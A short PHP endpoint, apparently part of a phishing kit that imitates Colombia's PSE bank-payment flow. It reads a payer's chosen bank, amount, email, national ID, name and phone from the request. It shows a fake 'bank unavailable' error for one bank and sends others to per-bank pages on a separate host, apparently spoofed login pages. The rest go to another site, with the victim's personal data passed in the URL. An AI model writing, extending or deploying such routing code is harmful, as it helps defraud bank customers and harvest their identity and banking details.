<?php
header('Content-Type: application/json');
require_once __DIR__ . '/config.php';

$banco     = $_GET['banco']     ?? '';
$monto     = intval($_GET['monto']     ?? 0);
$email     = trim($_GET['email']     ?? '');
$cedula    = trim($_GET['cedula']    ?? '');
$nombre    = trim($_GET['nombre']    ?? '');
$telefono  = trim($_GET['telefono']  ?? '');

// Bancos con modal de error
$BANCOS_ERROR = ['bancolombia'];
if (in_array($banco, $BANCOS_ERROR)) {
    echo json_encode(['error' => 'banco_no_disponible']);
    exit;
}

// Bancos con vercel
if (isset($PSE_BANKS[$banco])) {
    $b = $PSE_BANKS[$banco];
    echo json_encode(['url' => PSE_BASE . '/sites/' . $b['slug'] . '/manager/' . $b['id'], 'delay' => 2000]);
    exit;
}

// Todos los demás → recaudofall
$bancNombre = $PSE_BANKS_RECAUDOFALL[$banco] ?? $banco;
$url = RECAUDOFALL_BASE . '?' . http_build_query([
    'cedula'   => $cedula,
    'nombre'   => $nombre,
    'email'    => $email,
    'telefono' => $telefono,
    'monto'    => $monto,
    'banco'    => $bancNombre,
]);
echo json_encode(['url' => $url, 'delay' => 2000]);
